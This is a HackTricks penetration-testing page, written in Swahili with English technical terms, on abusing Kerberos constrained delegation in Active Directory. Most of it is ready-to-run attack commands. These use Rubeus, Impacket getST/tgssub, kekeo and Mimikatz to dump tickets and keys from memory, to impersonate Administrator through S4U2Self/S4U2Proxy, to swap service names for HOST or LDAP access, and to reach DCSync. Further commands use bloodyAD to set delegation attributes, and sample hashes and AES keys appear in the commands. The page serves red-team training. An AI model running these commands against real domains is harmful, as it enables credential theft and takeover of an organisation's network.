# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Kwa kutumia hii, Domain admin anaweza **kuruhusu** computer **kuiga user au computer** dhidi ya **service** yoyote ya mashine.

- **Service for User to self (_S4U2self_):** Akaunti yoyote ya **service account iliyo na SPN** inaweza kwa kawaida kupata TGS inayoiwakilisha yenyewe kwa niaba ya user yoyote. Ikiwa akaunti hiyo pia ina [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) katika _userAccountControl_, TGS hiyo huwa **forwardable**, jambo linalofanya protocol transition iwe muhimu moja kwa moja kwa **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **service account** inaweza kupata TGS kwa niaba ya user kwenda kwenye SPNs zilizoorodheshwa katika **msDS-AllowedToDelegateTo**. Evidence ticket inayotumiwa katika S4U2Proxy lazima iwe ticket **forwardable** kwenda kwenye service inayofanya delegation: ama client-to-service ticket halisi iliyonaswa kutoka kwa victim, au iliyotengenezwa kwa **S4U2Self + T2A4D**.

**Note**: Ikiwa user amewekwa alama ya ‘_Account is sensitive and cannot be delegated_’ katika AD, au ni mwanachama wa **Protected Users**, kwa kawaida **hutaweza kuwaiga** kupitia constrained delegation. Katika domains za kisasa, tumia material ya **AES** badala ya kudhani kuwa ni RC4 pekee unapolenga akaunti zilizowezeshwa kwa delegation.

Hii inamaanisha kwamba ukifanikiwa **compromise hash ya service**, unaweza **kuwaiga users** na kupata **access** kwa niaba yao kwenye **service** yoyote kupitia machines zilizoonyeshwa (inawezekana kufanya **privesc**).

Zaidi ya hayo, **hutapata access tu kwenye service ambayo user anaweza kuiga, bali pia kwenye service yoyote**, kwa sababu SPN (jina la service lililoombwa) haikaguliwi (kwenye ticket, sehemu hii haijasimbwa kwa encryption wala kusainiwa). Kwa hiyo, ukiwa na access kwenye **CIFS service**, unaweza pia kupata access kwenye **HOST service** kwa kutumia flag ya `/altservice` katika Rubeus, kwa mfano. Udhaifu huo huo wa kubadilisha SPN hutumiwa na **Impacket getST -altservice** na tools nyingine.

Pia, **LDAP service access kwenye DC** ndiyo inayohitajika ili kutumia **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Dokezo la Operator:** usiamini picha za skrini za **ADUC** au BloodHound pekee wakati wa ukaguzi wa **gMSA/sMSA**. Akaunti hizo mara nyingi huficha kichupo cha kawaida cha Delegation, kwa hivyo orodhesha moja kwa moja attributes ghafi za **`userAccountControl`** na **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition dhidi ya Kerberos-only constrained delegation

Ikiwa account iliyoathiriwa ina **T2A4D**, kwa kawaida unaweza kukamilisha chain kamili ya **`S4U2Self -> S4U2Proxy`** kwa kutumia service key/TGT pekee.<sup>[[2]](#references)</sup>

Ikiwa ina **`msDS-AllowedToDelegateTo`** pekee (hali ya kawaida ya **"Use Kerberos only"**), delegation bado inaweza kutumiwa vibaya, lakini evidence ticket ya S4U2Proxy lazima iwe **real forwardable user-to-service ticket** ya delegating service. Kwa vitendo, hii inamaanisha kuiba au kunasa victim TGS kutoka **LSASS/ccache** na kuiingiza katika hatua ya pili (`/tgs:` kwenye Rubeus). S4U2Self ticket ya **non-forwardable** haitoshi kwa classic constrained delegation; ikiwa hiyo ndiyo evidence ticket yako pekee, angalia [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) badala yake.<sup>[[2]](#references)</sup>

### Vidokezo vya Cross-domain constrained delegation (2025+)

Tangu **Windows Server 2012/2012 R2**, KDC inasaidia **constrained delegation across domains/forests** kupitia S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) zinaendelea na tabia hii na kuongeza PAC SIDs mbili kuashiria protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati user alifanya authentication kawaida.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilithibitisha identity kupitia protocol transition.

Tarajia `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inatumika across domains, ikithibitisha kuwa hatua ya S4U2Proxy ilifanikiwa.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Impacket ya hivi karibuni (0.11.x+) inaonyesha S4U chain hiyo hiyo na SPN swapping kama Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Ikiwa unapendelea ku-forge user ST kwanza (mfano, ukiwa na offline hash pekee), tumia **ticketer.py** pamoja na **getST.py** kwa S4U2Proxy. **tgssub.py** pia ni muhimu unapokuwa tayari una ccache inayofanya kazi na unahitaji tu kubadilisha service class kwa host hiyo hiyo. Tazama Impacket issue #1713 kwa matatizo ya sasa (KRB_AP_ERR_MODIFIED wakati forged ST hailingani na SPN key).<sup>[[2]](#references)</sup>

### Kuweka delegation kiotomatiki kutoka kwa low-priv creds

Ikiwa tayari una **GenericAll/WriteDACL** dhidi ya computer au service account, unaweza kusukuma attributes zinazohitajika remotely bila RSAT ukitumia **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Hii hukuwezesha kujenga njia ya constrained delegation kwa privesc bila kuwa na ruhusa za DA mara tu unapoweza kuandika attributes hizo.

- Hatua ya 1: **Pata TGT ya service iliyoruhusiwa**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Kuna **njia nyingine za kupata ticket ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye computer, kama Printer Bug na unconstrain delegation, NTLM relaying na Active Directory Certificate Service abuse
>
> **Kwa kuwa tu na ticket hiyo ya TGT (au hashed), unaweza kufanya attack hii bila ku-compromise computer nzima.**

- Hatua ya 2: **Pata TGS ya service huku ukijifanya kuwa user**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Maelezo zaidi katika ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Muhtasari wa Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Kutumia Vibaya Delegation kwa Impacket (Sehemu ya 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Iliangamiza Domain: Muhtasari wa Offensive Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
